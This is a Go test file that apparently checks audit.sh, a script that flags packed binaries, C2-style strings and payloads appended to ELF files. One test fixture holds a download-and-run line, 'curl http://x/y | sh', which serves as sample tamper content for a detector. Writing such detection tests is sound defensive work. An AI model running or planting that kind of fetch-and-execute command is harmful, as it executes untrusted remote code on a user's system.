package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// runAudit - Runs audit.sh against one file and returns its output and exit
// code. audit.sh is the only part of this repo that is not Go, and it scores a
// verdict the same way the filter does: an exit code a human acts on.
func runAudit(t *testing.T, target string) (string, int) {
	t.Helper()
	cmd := exec.Command("./audit.sh", target)
	out, err := cmd.CombinedOutput()
	code := 0
	if ee, ok := err.(*exec.ExitError); ok {
		code = ee.ExitCode()
	} else if err != nil {
		t.Fatalf("running audit.sh %s: %v", target, err)
	}
	return string(out), code
}

// TestAuditBinary_VerdictFollowsTamperSignals - A file with no tamper signal
// exits 0, a file carrying packer magic and C2 strings exits 1 and names each
// signal. The exit code is what `make audit` and any CI wrapper reads, so it is
// checked alongside the text.
func TestAuditBinary_VerdictFollowsTamperSignals(t *testing.T) {
	dir := t.TempDir()
	clean := filepath.Join(dir, "clean")
	if err := os.WriteFile(clean, []byte("nothing interesting in this file at all\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	dirty := filepath.Join(dir, "dirty")
	if err := os.WriteFile(dirty, []byte("UPX!\nreach us at pastebin.com\ncurl http://x/y | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	out, code := runAudit(t, clean)
	if code != 0 {
		t.Errorf("clean file: exit %d, want 0\n%s", code, out)
	}
	if !strings.Contains(out, "NO TAMPER SIGNALS") {
		t.Errorf("clean file: verdict missing from output\n%s", out)
	}

	out, code = runAudit(t, dirty)
	if code != 1 {
		t.Errorf("tampered file: exit %d, want 1\n%s", code, out)
	}
	for _, want := range []string{"packed (UPX)", "pastebin", "curl", "SUSPICIOUS"} {
		if !strings.Contains(out, want) {
			t.Errorf("tampered file: %q missing from output\n%s", want, out)
		}
	}
}

// TestAuditBinary_AppendedPayloadIsFlagged - The self-extractor trick: bytes
// living past the end of the ELF section-header table. Reconstructing where the
// file ought to end is arithmetic over three readelf fields, and getting one
// wrong turns the check off silently rather than making it fail — so it needs a
// case of its own. The fixture is a borrowed system ELF audited twice, clean and
// then with a payload glued on, so the verdict has to come from the arithmetic
// and not from anything else in the file. Never the test binary: that one
// carries these very check strings and would match itself.
func TestAuditBinary_AppendedPayloadIsFlagged(t *testing.T) {
	if _, err := exec.LookPath("readelf"); err != nil {
		t.Skip("no readelf on this host; the ELF arithmetic cannot run")
	}
	elf, err := os.ReadFile("/bin/true")
	if err != nil {
		t.Skip("no /bin/true to borrow as an ELF fixture: " + err.Error())
	}
	fixture := filepath.Join(t.TempDir(), "fixture")
	if err := os.WriteFile(fixture, elf, 0o755); err != nil {
		t.Fatal(err)
	}
	if out, code := runAudit(t, fixture); code != 0 {
		t.Skipf("borrowed ELF is not clean on this host (exit %d); nothing to compare against\n%s", code, out)
	}

	if err := os.WriteFile(fixture, append(elf, make([]byte, 8192)...), 0o755); err != nil {
		t.Fatal(err)
	}
	out, code := runAudit(t, fixture)
	if code != 1 {
		t.Errorf("ELF with 8K glued on: exit %d, want 1\n%s", code, out)
	}
	if !strings.Contains(out, "after section headers") {
		t.Errorf("ELF with 8K glued on: appended-data signal missing\n%s", out)
	}
}
